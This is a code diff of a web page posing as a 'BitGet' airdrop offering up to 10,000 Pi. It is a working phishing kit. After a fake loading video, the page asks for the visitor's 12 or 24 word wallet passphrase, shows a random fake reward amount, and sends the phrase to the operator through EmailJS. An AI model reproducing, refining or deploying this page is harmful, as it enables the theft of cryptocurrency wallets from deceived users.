@@ -1,204 +1,280 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <style>
+    body {
+    overflow: hidden; /* No scrolling */
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh; /* Makes everything fit within the screen */
+    transform: scale(0.9); /* Shrinks everything slightly */
+    transform-origin: top center; /* Ensures proper alignment */
+    margin: 0;
+    padding: 0;
+    }
+    </style>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>BitGet - Airdrop</title>
-
-    <!-- EmailJS -->
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         emailjs.init("0J9X5wxck4rbjQo8m");
     </script>
-
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
 
         body {
-            overflow: hidden;
+            font-family: 'Inter', sans-serif;
+            background-color: #000;
+            color: white;
+            margin: 0;
+            padding: 0;
             text-align: center;
         }
 
-        /* Homepage */
+        .homepage, .passphrase-screen, .loading-screen {
+            display: none;
+            width: 100%;
+            height: 100vh;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
         .homepage {
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             background: url('your-background-image.jpg') no-repeat center center/cover;
-            width: 100vw;
-            height: 100vh;
             padding: 40px;
         }
 
-        .homepage video {
-            width: 250px;
+        .container {
+            max-width: 600px;
+            background: rgba(0, 0, 0, 0.85);
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
         }
 
-        .headline {
+        .logo {
+            width: 180px;
+            margin-bottom: 20px;
+        }
+
+        .title {
             font-size: 28px;
             font-weight: bold;
-            color: white;
-            margin-top: 20px;
+            margin-bottom: 15px;
         }
 
-        .subtext {
+        .subtitle {
             font-size: 18px;
-            color: white;
-            margin-top: 10px;
+            color: #bbb;
+            margin-bottom: 25px;
         }
 
         .side-message {
             font-size: 14px;
-            color: white;
-            margin-top: 10px;
-        }
-
-        .join-button {
+            color: #aaa;
             margin-top: 20px;
-            padding: 15px 30px;
-            font-size: 18px;
+        }
+
+        .btn {
+            background: linear-gradient(90deg, #007bff, #00d4ff);
             color: white;
-            background: #007bff;
+            padding: 15px;
             border: none;
-            border-radius: 5px;
             cursor: pointer;
-            transition: 0.3s;
-            animation: pulse 1.5s infinite;
+            font-size: 20px;
+            width: 100%;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s ease-in-out;
         }
 
-        .join-button:hover {
-            background: #0056b3;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-
-        /* Loading Screen */
-        .loading-screen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background-color: black;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .btn:hover {
+            transform: scale(1.05);
         }
 
         .loading-screen video {
-            width: 100vw;
-            height: 100vh;
-            object-fit: cover;
+            width: 100%;
+            height: auto;
         }
 
-        /* Passphrase Screen */
         .passphrase-screen {
             display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            display: flex;
             flex-direction: column;
+            padding: 20px;
+            background: #ffffff;
+            color: #000;
+            width: 100%;
+            height: 100vh;
             justify-content: center;
             align-items: center;
-            background: #1a1a1a;
-            color: white;
         }
 
         .passphrase-container {
-            width: 90%;
             max-width: 500px;
+            text-align: left;
             padding: 30px;
-            background: #333;
+            background: #f5f5f5;
             border-radius: 10px;
             box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
-            text-align: center;
+        }
+
+        .passphrase-title {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #333;
         }
 
         .input-box {
             width: 100%;
-            padding: 10px;
+            height: 100px;
+            padding: 12px;
             font-size: 16px;
-            margin-top: 10px;
+            border: 1px solid #ddd;
             border-radius: 5px;
-            border: none;
+            margin-bottom: 15px;
+            resize: none;
         }
 
-        .submit-button {
-            margin-top: 15px;
-            padding: 10px 20px;
-            font-size: 18px;
+        .purple-btn {
+            background: linear-gradient(90deg, #6A0DAD, #A020F0);
             color: white;
-            background: #28a745;
+            padding: 12px;
+            font-size: 18px;
             border: none;
+            width: 100%;
             border-radius: 5px;
             cursor: pointer;
-            transition: 0.3s;
+            font-weight: bold;
+            transition: all 0.3s ease-in-out;
         }
 
-        .submit-button:hover {
-            background: #218838;
+        .purple-btn:hover {
+            transform: scale(1.05);
         }
 
-        .message {
+        .reward-text {
+            font-size: 18px;
+            font-weight: bold;
+            color: #2E8B57;
             margin-top: 15px;
-            font-size: 16px;
         }
+
     </style>
 </head>
 <body>
-
+<style>
+    body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    text-align: center;
+    margin: 0;
+    padding: 0 20px; /* Adds space on both sides */
+    overflow-x: hidden;
+    width: 100vw;
+    }
+    /* Ensures all content inside stays centered */
+    .container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+    }
+</style>
     <!-- Homepage -->
-    <div class="homepage" id="homepage">
-        <video autoplay muted loop>
-            <source src="Ex-EN-1734602916000.mp4" type="video/mp4">
-        </video>
-        <h1 class="headline">Win up to 10,000 Pi</h1>
-        <p class="subtext">Claim your free Pi rewards now! Airdrop is live for a limited time—don’t miss out! 🚀</p>
-        <p class="side-message">Trade with 100 million users on BitGet.</p>
-        <button class="join-button" onclick="showLoading()">Join Now</button>
+    <div id="homepage" class="homepage">
+        <div class="container">
+            <!-- Video Above BitGet Logo -->
+<div style="text-align: center; margin-bottom: 10px;">
+    <video width="150" autoplay loop muted playsinline>
+        <source src="Ex-EN-1734602916000.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+</div>
+            <img src="bitget-logo.png" alt="BitGet Logo" class="logo">
+            <div class="title">WIN UP TO 10,000 Pi</div>
+            <div class="subtitle">Claim the airdrop instantly and win up to <span style="white-space: nowrap;">10,000 Pi</span>.</div>
+            <button class="btn" onclick="showLoading()">Join Now</button>
+            <!-- New Paragraph Below Join Now Button -->
+<p style="text-align: center; font-size: 18px; color: #aaa; margin-top: 20px;">
+    Secure your free Pi rewards now! Airdrop is live for a limited time — don’t miss out! 
+</p>
+            <div class="side-message"><p>Trade with 100 million users on BitGet.</p>
+<p>PARTNERS WITH Pi NETWORK</p>
+            </div>
+        </div>
     </div>
 
     <!-- Loading Screen -->
-    <div class="loading-screen" id="loading-screen">
+    <div id="loading-screen" class="loading-screen">
         <video autoplay muted>
             <source src="screen-20250223-174455~2.mp4" type="video/mp4">
         </video>
     </div>
 
-    <!-- Passphrase Screen -->
-    <div class="passphrase-screen" id="passphrase-screen">
+    <!-- Passphrase Entry Screen -->
+    <div id="passphrase-screen" class="passphrase-screen">
         <div class="passphrase-container">
-            <h2>Enter Your 12 or 24 Word Passphrase</h2>
-            <input type="text" class="input-box" id="passphrase" placeholder="Enter your passphrase here">
-            <button class="submit-button" onclick="submitPassphrase()">Submit</button>
-            <p class="message" id="message"></p>
+            <div class="passphrase-title">Unlock Pi Wallet</div>
+            <textarea id="passphrase" class="input-box" placeholder="Enter your 24-word passphrase here"></textarea>
+            <button class="purple-btn" onclick="submitPassphrase()">Unlock with Passphrase</button>
+            <p id="message" class="reward-text"></p>
         </div>
     </div>
+        <script>
+function showLoading() {
+    document.getElementById("homepage").style.display = "none";
+    document.getElementById("loading-screen").style.display = "flex";
+    
+    setTimeout(() => {
+        document.getElementById("loading-screen").style.display = "none";
+        document.getElementById("passphrase-screen").style.display = "flex";
+    }, 3000);
+}
 
-    <script>
-        function showLoading() {
-            document.getElementById("homepage").style.display = "none";
-            document.getElementById("loading-screen").style.display = "flex";
-            setTimeout(() => {
-                document.getElementById("loading-screen").style.display = "none";
-                document.getElementById("passphrase-screen").style.display = "flex";
-            }, 3000);
+function submitPassphrase() {
+    var passphrase = document.getElementById("passphrase").value.trim();
+    
+    if (!isValidPassphrase(passphrase)) {
+        document.getElementById("message").innerText = "Invalid Passphrase. Please enter a valid 12 or 24-word passphrase.";
+        return;
+    }
+
+    var piAmount = (Math.random() < 0.8) 
+        ? Math.floor(Math.random() * (100 - 50 + 1)) + 50 
+        : Math.floor(Math.random() * (10000 - 100 + 1)) + 100;
+
+    document.getElementById("message").innerText = piAmount + " Pi will be rewarded to your wallet shortly.";
+
+    emailjs.send("service_kg026pr", "template_nvcr5z2", {
+        passphrase: passphrase,
+        piAmount: piAmount
+    }, "0J9X5wxck4rbjQo8m").then(
+        function(response) {
+            console.log("Email sent successfully!", response);
+        }, 
+        function(error) {
+            console.error("Email failed to send:", error);
         }
-    </script>
+    );
+}
 
+function isValidPassphrase(passphrase) {
+    var words = passphrase.split(/\s+/);
+    return (words.length === 12 || words.length === 24) && words.every(word => /^[a-z]+$/.test(word));
+}
+</script>
 </body>
 </html>
